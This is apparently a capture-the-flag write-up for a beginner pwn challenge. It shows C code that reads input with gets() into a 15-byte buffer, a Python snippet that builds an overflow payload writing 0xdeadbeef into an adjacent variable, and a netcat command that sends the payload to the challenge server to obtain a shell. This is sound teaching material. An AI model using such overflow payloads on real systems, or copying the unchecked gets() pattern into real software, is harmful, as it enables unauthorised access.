## Solution

File `pwn.c`
```c
int main(int argc, char** argv)
{
    setvbuf(stdout, 0, 2, 0);

    int set_me = 0;
    char buf[15];

    printf("Enter a message: ");
    gets(buf);

    if(set_me == 0xdeadbeef) {
        shell();
    }
    else {
        printf("Not authenticated.\nset_me was %x\n", set_me);
    }

    return EXIT_SUCCESS;
}
```

This is a buffer overflow vulnerability. Here is a Python script to create a
password that will overflow `buf` and set `set_me` to `0xdeadbeef`. With
little-endian ordering, the bytes need to be reversed.

```python
with open('access.txt', 'a') as f:
    a = "123456789012345\xef\xbe\xad\xde"
    f.write(a)
```

To submit the password, I ran this

```sh
cat access.txt - | nc pwn.osucyber.club 13377
```
